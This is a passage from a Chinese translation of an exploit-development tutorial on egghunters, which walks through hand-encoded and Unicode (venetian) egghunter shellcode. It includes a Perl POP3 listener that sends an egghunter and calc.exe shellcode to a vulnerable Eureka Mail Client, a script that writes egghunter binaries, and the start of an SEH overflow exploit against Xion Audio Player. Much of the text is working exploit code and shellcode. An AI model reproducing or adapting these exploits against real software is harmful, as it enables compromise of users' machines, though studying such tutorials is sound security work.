"\x2d\x55\x30\x66\x46".
"\x2d\x55\x47\x66\x44".
"\x50". #push eax
#---------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x50\x3e\x39\x31". #x0F x42 x52 x6A
"\x2d\x50\x3e\x39\x32".
"\x2d\x51\x41\x3b\x32".
"\x50". #push eax
#----------------------------
"\x25\x4A\x4D\x4E\x55". #zero eax
"\x25\x35\x32\x31\x2A". #
"\x2d\x33\x35\x70\x55". #x66 x81 xCA xFF
"\x2d\x33\x25\x70\x55".
"\x2d\x34\x24\x55\x55".
"\x50". #push eax
#------------------------------
"\x41\x41\x41\x41"; #some nops
#calc.exe
my $shellcode="\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
my $payload=$junk.$ret.$egghunter.$padding."w00tw00t".$shellcode;
#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host\n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
print "[+] Client connected, sending evil payload\n";
my $cnt=1;
while($cnt Sent ".length($payload)." bytes\n";
$cnt=$cnt+1;
}
}
close CLIENT;
print "[+] Connection closed\n";
把这份代码用在你的exploit中时，如果失败也不要感到惊讶。毕竟，这里是采用的手工编码的方式，使用了一
个假定的bad chars列表，这里使用的各个偏移量（offset）的值也可是需要精心调整的，当然还会有一些其他因素。
需要注意的是这份代码（220个字节）比没有编码的原始的寻蛋代码（30个字节）长的多，所以需要更大的缓
冲区。
Shellcode 被转换成了 UNICODE
如果Shellcode的内容被转换成UNICODE，那该怎么办呢？
看来你确实在思考。
首先这里存在两种情况，我们分开来讨论它们。
情况 1：内存中仍存在 Shellcode 的 ASCII 拷贝。
这种情况并不稀奇，所以值得花点时间。通常应用程序按Ascii码的格式来接受数据，然后再把数据转换为Unicde.
所以当溢出发生时，ASCII格式的数据可能仍存在在内存中。
找出内存中是否存在 Ascii 版本的 shellcode 的方法是使用插件提供的!pvefindaddr compare 
功能。这个功能需要我们首先把 shellcode 保存在一个文件中。如果内存中存在 shellcode 拷贝,并
且这份拷贝没有没被修改和破坏，也没有被转换成UNICODE.那么插件就会帮我们找到这份拷贝。
这种情况需要我们：
 把寻蛋代码转换成一个venetian shellcode并使它被执行。（这样shellcode包含比转换前更多的字节，
所以也需要更大的缓冲区）
 把真正的(前置了标记的)shellcode放在内存的某个位置。标记和shellcode都必须是ascii。
venetian shellcode运行时，将找到内存中的shellcode的ASCII版本，然后执行它。Game Over!
把寻蛋代码转换为venetian shellcode是很容易的。只需把寻蛋代码写到一个文件中，然后用alpha2（或
者最新版的alpha3）把文件转换为UNICODE（这点可以参考前面指导中关于UNICODE的部分）。
下面是一个UNICODE版本的寻蛋代码，同样使用w00t做标记，使用EAX做基础寄存器（basereg）。
#Corelan Unicode egghunter - Basereg=EAX - tag=w00t
my $egghunter = "PPYAIAIAIAIAQATAXAZAPA3QADAZ".
"ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX".
"A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA".
"BAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ4".
"4JO7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA";
UNICODE版本的寻蛋代码最大的好处就是可以容易的调整开始搜索的内存地址位置。
如果我们能在栈上找到寻蛋代码和shellcode，那么现在我们就不需要搜索一大片的内存内存。因为我们现在可
以生成包含有null字符的寻蛋代码。NULL字符也不在是我们的障碍。
如果你想用“\x66\x81\xCA\x00\x00”替换“\x66\x81\xCA\xFF\x0F”来影响开始搜索地址，我一点也不会奇
怪。(事实上，当我创建unicode shellcode时，我也这么做了。不是因为我必须这么做，仅仅是我想试一下)
情况 2：只有 UNICODE 的版本
这种情况下没有ASCII形式的shellcode可以利用，因为一切都是unicode。
天无绝人之路！只是增加了作出一个exploit的时间而已。
首先，我们仍然需要一个版本的寻蛋代码，不过这次需要标记也是 unicode 的。毕竟我们还需要把标记（这时
标记需要是unicode的）放在真的shellcode前面。
除了这些，还需要调整寄存器两次。第一次是为了执行寻蛋代码。第二次调整发生在标记和真正的 shellcode
之间。 (只有这样才能执行真正的shellcode).
简而言之：
触发溢出，跳转code that aligns register and adds some padding if required, and then jumps
to
- unicode shellcode that would self-decode and run the egg hunter which would
- look for a double tag in memory (locating the egg – unicode friendly) and then
- execute the code right after the tag, which would need to
- align register again, add some padding, and then
- execute the unicode (real) shellcode (which will decode itself again and run the final
shellcode)
我们需要生成一个标记的 venetian 寻蛋代码。前面的例子中，使用的标记为 w00t,对应的 16 进制
代码为：0x77,0x30,0x30,0x74(little endian).如果用 null 字节替换第一、三字节，结果就是
0x00,0x30,0x00,0x74 (对应的ascii : t– null–0–null)。
下面是把寻蛋代码写入一个二进制文件的脚本：
#!/usr/bin/perl
# Little script to write egghunter shellcode to file
# 2 files will be created :
# - egghunter.bin : contains w00t as tag
# - egghunterunicode.bin : contains 0x00,0x30,0x00,0x74 as tag
#
# Written by Peter Van Eeckhoutte
# http://www.corelan.be:8800
#
my $egghunter =
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
print "Writing egghunter with tag w00t to file egghunter.bin...\n";
open(FILE,">egghunter.bin");
print FILE $egghunter;
close(FILE);
print "Writing egghunter with unicode tag to file egghunter.bin...\n";
open(FILE,">egghunterunicode.bin");
print FILE "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C";
print FILE "\x05\x5A\x74\xEF\xB8";
print FILE "\x00"; #null
print FILE "\x30"; #0
print FILE "\x00"; #null
print FILE "\x74"; #t
print FILE "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
close(FILE);
（我们看到，这个脚本把ASCII格式的寻蛋代码写到一个文件中。说不定那天我们也用的着）
现在把文件egghunterunicode.bin转换成venetian shellcode：
./alpha2 eax --unicode --uppercase 的最后一个字节是null).
所以调整指令应该是以 00 xx 00的形式开始，我们用的是00 6d 00(当然也可以是其他的值).
NOTE ： 小心在解码 venetian shellcode 代码时不要覆盖了寻蛋代码或真正的 shellcode（包括标记）。
因为这将使Expolit失败。
理论可靠么？
我们这次仍然使用软件xion audio player 1.0 build 121中的漏洞（具体细节参考第七章）来测试。这里我
不打算重复构建exploit的步骤，也不打算细谈各种校正细节。不过我已经在脚本中把我认为重要的东西都进行了
注释。如果你在构建、阅读或使用这个脚本的过程中遇到什么问题，那么你应该再回头仔细阅读第7部分。当然你
也可以跳过这里，直接开始阅读下一部分。
# [*] Vulnerability : Xion Audio Player Local BOF
# [*] Written by : corelanc0d3r (corelanc0d3r[at]gmail[dot]com)
# -----------------------------------------------------------------------
# Exploit based on original unicode exploit from tutorial part 7
# but this time I'm using a unicode egghunter, just for phun !
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
#
my $sploitfile="corelansploit.m3u";
my $junk = "\x41" x 254; #offset until we hit SEH
my $nseh="\x58\x48"; #put something into eax - simulate nop
my $seh="\xf5\x48"; #ppr from xion.exe - unicode compatible
# will also simulate nop when executed
# after p/p/r is executed, we end here
# in order to be able to run the unicode decoder
# we need to have eax pointing at our decoder stub
# we'll make eax point to our buffer
# we'll do this by putting ebp in eax and then increase eax
# until it points to our egghunter
#first, put ebp in eax (push / pop)
my $align="\x55"; #push ebp
$align=$align."\x6d"; #align/nop